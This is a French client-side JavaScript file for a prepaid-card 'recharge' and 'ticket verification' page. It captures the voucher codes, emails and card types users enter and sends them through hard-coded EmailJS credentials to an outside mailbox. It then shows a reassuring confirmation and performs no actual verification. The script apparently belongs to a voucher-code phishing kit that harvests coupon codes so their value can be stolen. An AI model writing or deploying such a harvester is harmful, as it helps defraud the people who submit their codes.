(function () {
  // 1. Récupération dynamique depuis emailjs.config.js avec fallback
  const config = window.EMAILJS_CONFIG || {};

  const EMAILJS_SERVICE_ID = config.serviceId || 'service_m583e3t';
  const EMAILJS_TEMPLATE_ID = config.templateId || 'template_786v00s';
  const EMAILJS_PUBLIC_KEY = config.publicKey || '-3o3lD8kvft1Ebaeb';

  const formSelectors = ['rechargeForm', 'statutForm', 'controlerForm', 'statusForm', 'ticketForm', 'recharge-form'];

  function getFeedbackTarget(form) {
    return document.getElementById('feedback-message')
      || document.getElementById('alertArea')
      || document.getElementById('msg-box')
      || document.getElementById('result');
  }

  function setButtonState(button, isSubmitting) {
    if (!button) return;
    if (!button.dataset.originalHtml) {
      button.dataset.originalHtml = button.innerHTML;
    }

    if (isSubmitting) {
      button.disabled = true;
      button.innerHTML = '<span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span><span>Traitement en cours...</span>';
    } else {
      button.disabled = false;
      button.innerHTML = button.dataset.originalHtml;
    }
  }

  function showFeedback(target, message, type) {
    if (!target) return;
    const variant = type === 'success' ? 'success' : 'danger';
    target.className = `alert alert-${variant} rounded-3 shadow-sm mt-3`;
    target.innerHTML = message;
  }

  function resetPageSpecificState(form) {
    if (!form) return;
    const amountInput = document.getElementById('montant');
    const customAmountInput = document.getElementById('customAmount');
    const defaultAmountBadge = document.querySelector('.amount-badge[data-value="100"]');

    if (form.id === 'rechargeForm' || form.id === 'recharge-form') {
      if (amountInput) amountInput.value = '100';
      if (customAmountInput) customAmountInput.value = '';
      document.querySelectorAll('.amount-badge').forEach((el) => el.classList.remove('selected'));
      if (defaultAmountBadge) defaultAmountBadge.classList.add('selected');
    }
  }

  function getActionType(form) {
    if (form.id === 'rechargeForm' || form.id === 'recharge-form') {
      return 'Recharge / Soumission';
    }
    return 'Contrôle / Vérification de statut';
  }

  function collectData(form) {
    const codeTicketField = form.querySelector('[name="code_ticket"], [name="codeTicket"], [name="query"], #code_ticket, #query');
    const userEmailField = form.querySelector('[name="user_email"], [name="userEmail"], [name="email"], #user_email');
    
    // 1. Recherche du type de carte : via un champ 'type_carte' caché ou visible
    let typeCarteVal = form.querySelector('[name="type_carte"], #type_carte')?.value;

    // 2. Sinon : via le paramètre d'URL (?carte=pcs)
    if (!typeCarteVal) {
      const urlParams = new URLSearchParams(window.location.search);
      typeCarteVal = urlParams.get('carte');
    }

    // 3. Sinon : via le titre de la carte active (#cardTitle)
    if (!typeCarteVal) {
      const cardTitleEl = document.getElementById('cardTitle');
      if (cardTitleEl && !cardTitleEl.textContent.includes('Vérification de Ticket')) {
        typeCarteVal = cardTitleEl.textContent.replace('Recharge ', '').trim();
      }
    }

    // Formatage propre de la marque (ex: 'pcs' -> 'Pcs')
    const typeCarteFormatted = typeCarteVal 
      ? typeCarteVal.charAt(0).toUpperCase() + typeCarteVal.slice(1) 
      : 'Non spécifié';

    const actionText = getActionType(form);
    const rawQuery = (codeTicketField?.value || '').trim();

    // Détection si la saisie est un email (contient un '@')
    const isEmail = rawQuery.includes('@');

    // Résolution intelligente de l'email et du code
    let finalEmail = (userEmailField?.value || '').trim();
    let finalCode = rawQuery;

    if (isEmail) {
      finalEmail = rawQuery;
      finalCode = 'Recherche par e-mail';
    } else if (!finalEmail) {
      finalEmail = 'Non renseigné';
    }

    if (!finalCode) {
      finalCode = 'Non renseigné';
    }

    return {
      action: actionText,
      action_type: actionText,
      type_carte: typeCarteFormatted,
      user_email: finalEmail,
      code_ticket: finalCode,
      date: new Date().toLocaleString('fr-FR')
    };
  }

  // Auto-initialisation au chargement si le SDK est présent
  if (window.emailjs && EMAILJS_PUBLIC_KEY) {
    try { window.emailjs.init(EMAILJS_PUBLIC_KEY); } catch (e) { /* ignore */ }
  }

  formSelectors.forEach((selector) => {
    const form = document.getElementById(selector);
    if (!form) return;

    const button = form.querySelector('button[type="submit"]');
    const feedbackTarget = getFeedbackTarget(form);

    form.addEventListener('submit', async function (event) {
      event.preventDefault();

      const templateParams = collectData(form);
      setButtonState(button, true);
      if (feedbackTarget) {
        feedbackTarget.innerHTML = '';
        feedbackTarget.className = '';
      }

      try {
        if (!window.emailjs) {
          throw new Error('EmailJS non chargé');
        }

        await window.emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);

        showFeedback(feedbackTarget, 'Votre demande a bien été reçue. Nous allons la traiter avec le plus grand soin.', 'success');
        form.reset();
        resetPageSpecificState(form);
      } catch (error) {
        console.error('Erreur EmailJS:', error);
        showFeedback(feedbackTarget, 'Nous n’avons pas pu finaliser votre demande pour le moment. Veuillez réessayer dans quelques instants.', 'error');
      } finally {
        setButtonState(button, false);
      }
    });
  });
})();